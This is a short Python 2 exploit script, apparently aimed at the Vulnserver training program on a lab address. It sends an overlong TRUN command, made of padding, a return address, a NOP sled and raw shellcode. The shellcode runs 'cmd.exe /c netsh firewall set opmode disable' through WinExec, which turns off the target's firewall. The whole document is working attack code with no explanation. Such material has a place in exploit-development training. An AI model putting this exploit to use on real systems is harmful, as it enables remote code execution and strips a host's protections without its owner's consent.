import socket
import struct

print "\nTRUN Command - Disable firewall using Winexec\n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    buf =  b""
    buf += "\x31\xd2\x52\x68\x61\x62\x6c\x65\x68\x20\x64\x69\x73\x68\x6d\x6f\x64\x65\x68\x74\x20\x6f\x70\x68\x6c\x20\x73\x65\x68\x65\x77\x61\x6c\x68\x20\x66\x69\x72\x68\x65\x74\x73\x68\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe3\x42\x52\x53\xba\xad\x23\x86\x7c\xff\xd2" 
 
    evil_buf = "TRUN /.:/"
    evil_buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\x90'*32 + buf 

    bytes_sent = s.send(evil_buf)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
